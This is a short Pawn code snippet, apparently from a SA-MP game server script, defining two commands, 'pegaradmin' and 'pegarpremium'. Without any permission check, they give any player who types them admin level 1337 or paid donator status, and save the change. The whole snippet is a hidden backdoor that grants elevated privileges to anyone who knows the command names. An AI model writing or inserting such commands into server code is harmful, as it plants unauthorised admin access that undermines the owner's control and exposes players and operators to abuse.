CMD:pegaradmin(playerid, params[]) {	
  	uInfo[playerid][uAdmin] = 1337;
	SaveUserInfo(playerid);
	return true;
}

CMD:pegarpremium(playerid, params[]) {	
  	pInfo[playerid][pDonator] = 3;
	SavePlayerPremium(playerid);
	return true;
}
